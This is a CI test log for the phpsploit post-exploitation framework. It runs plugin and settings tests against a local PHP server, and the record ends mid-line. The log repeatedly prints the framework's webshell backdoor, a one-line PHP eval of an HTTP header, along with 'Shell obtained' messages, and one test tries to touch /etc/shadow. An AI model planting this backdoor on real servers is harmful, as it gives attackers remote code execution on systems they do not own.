\u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins/issue74_non-connected-plugin-run-errmsg.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins/issue74_non-connected-plugin-run-errmsg.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.JkVS8dNVHZ\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Issue #74:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Make warning message explicit when running plugin in non-connected mode\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ref: https://github.com/nil0x42/phpsploit/issues/74\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'pwd' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q 'Must connect to run `pwd` plugin' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m$PHPSPLOIT -e 'exploit; pwd' > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q 'Must connect to run `pwd` plugin' $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins/issue74_non-connected-plugin-run-errmsg.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=2s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins/touch.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins/touch.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.7ISswrRD7s\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# connect phpsploit\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe exploit > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# permission denied\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch /etc/shadow > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"Permission denied\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# no such file or directory\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch /laskdjlsakjdlaskjd/notexist > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"No such file or directory\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# touch directory (must work)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe stat . > $TMPFILE-before || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2msleep 1\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch . > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe stat . > $TMPFILE-after || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-before $TMPFILE-after > $TMPFILE-diff && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m< $TMPFILE-diff grep '^>' > $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m Accessed: \u001b[m\n[Unit Tests/build]   | \u001b[33;2m Modified: \u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# touch existing file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch index.php > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# touch existing file with invalid `ref` file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch -r notexist index.php > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE 'cannot stat.*notexist.*No such file'\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# touch existing file with existing `ref` file\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch -r index.php newfile.txt > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe stat index.php > $TMPFILE-before || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe stat newfile.txt > $TMPFILE-after || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-before $TMPFILE-after > $TMPFILE-diff && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# touch file with -t (partial timestamp)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch -t 2015 index.php > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe stat index.php > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# year must be set to 2015\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q ' 2015-' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# hh:mm:ss must NOT be set to 00:00:00 (should be random)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q '00:00:00' $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# run touch with invalid arg\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe touch --invalid-arg FOOBAR > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/plugins/touch.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=3s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings/BROWSER.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings/BROWSER.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.M40cs03qlY\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/usr/bin/env bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### VALID VALUES\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BROWSER %%DEFAULT%% > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_no_output $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BROWSER default > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_no_output $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# issue #128: BROWSER default fails if no browser available\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Ref: https://github.com/nil0x42/phpsploit/issues/128\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BROWSER disabled > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_no_output $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### INVALID VALUES\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set BROWSER invalid_val > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[\\!\\] Value Error: Can't bind to 'invalid_val'. Valid choices:\u001b[m\n[Unit Tests/build]   | \u001b[33;2m'disabled'\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings/BROWSER.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=1s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings/PROXY.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/settings/PROXY.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.s6VnSDEbeI\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/usr/bin/env bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### VALID VALUES\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mvalid_schemes=\"http https socks4 socks4a socks5 socks5h\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2minvalid_schemes=\"xxx httpx httpss socks socks4h socks5a\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set PROXY None || FAIL\u001b[m\n[Unit Tests/build]   | [#] CMD('set' 'VERBOSITY' 'True'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'REQ_INTERVAL' '0'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'REQ_INTERVAL' '0'): Returned 0\n[Unit Tests/build]   | [#] CMD('alias' 'true' 'lrun true'): Running...\n[Unit Tests/build]   | [#] CMD('alias' 'true' 'lrun true'): Returned 0\n[Unit Tests/build]   | [#] CMD('alias' '@lrun' 'lrun'): Running...\n[Unit Tests/build]   | [#] CMD('alias' '@lrun' 'lrun'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'TARGET' '127.0.0.1:42211'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'TARGET' '127.0.0.1:42211'): Returned 0\n[Unit Tests/build]   | [#] CMD('source' '-e' '/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config/config'): Returned 0\n[Unit Tests/build]   | [#] CMD('set' 'PROXY' 'None'): Running...\n[Unit Tests/build]   | [#] CMD('set' 'PROXY' 'None'): Returned 0\n[Unit Tests/build]   | \u001b[33;2mfor scheme in $invalid_schemes; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo invalid_scheme=$scheme\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe set PROXY \"$scheme://0.0.0.0:23487\" > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    assert_contains $TMPFILE \"Value Error: Invalid proxy format\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe exploit || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe exit || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | invalid_scheme=xxx\n[Unit Tests/build]   | [#] CMD('exploit'): Running...\n[Unit Tests/build]   | [*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>\n[Unit Tests/build]   | \n[Unit Tests/build]   | [*] Sending payload to http://127.0.0.1:42211/ ...\n[Unit Tests/build]   | [*] Shell obtained by PHP (127.0.0.1 -> 127.0.0.1)\n[Unit Tests/build]   | \n[Unit Tests/build]   | Connected to Linux server (127.0.0.1)\n[Unit Tests/build]   | running PHP 8.0.10 on PHP 8.0.10 Development Server\n[Unit Tests/build]   | [#] CMD('exploit'): Returned 0\n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] CMD('exit'): Returned 0\n[Unit Tests/build]   | invalid_scheme=httpx\n[Unit Tests/build]   | [#] CMD('exploit'): Running...\n[Unit Tests/build]   | [*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>\n[Unit Tests/build]   | \n[Unit Tests/build]   | [*] Sending payload to http://127.0.0.1:42211/ ...\n[Unit Tests/build]   | [*] Shell obtained by PHP (127.0.0.1 -> 127.0.0.1)\n[Unit Tests/build]   | \n[Unit Tests/build]   | Connected to Linux server (127.0.0.1)\n[Unit Tests/build]   | running PHP 8.0.10 on PHP 8.0.10 Development Server\n[Unit Tests/build]   | [#] CMD('exploit'): Returned 0\n[Unit Tests/build]   | [#] CMD('exit'): Running...\n[Unit Tests/build]   | [#] CMD('exit'): Returned 0\n[Unit Tests/build]   | invalid_scheme=httpss\n[Unit Tests/build]   | [#] CMD('exploit'): Running...\n[Unit Tests/build]   | [*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>\n[Unit Tests/build]   | \n[Unit Tests/build]   | [*] Sending payload to http://127.0.0.1:42211/ ...\n[Unit Tests/build]   | [*] Shell obtained by PHP (127.0.0.1 -> 127.0.0.1)\n[Unit Tests/build]   | \n[Unit Tests/build]   | Connected to Linux server 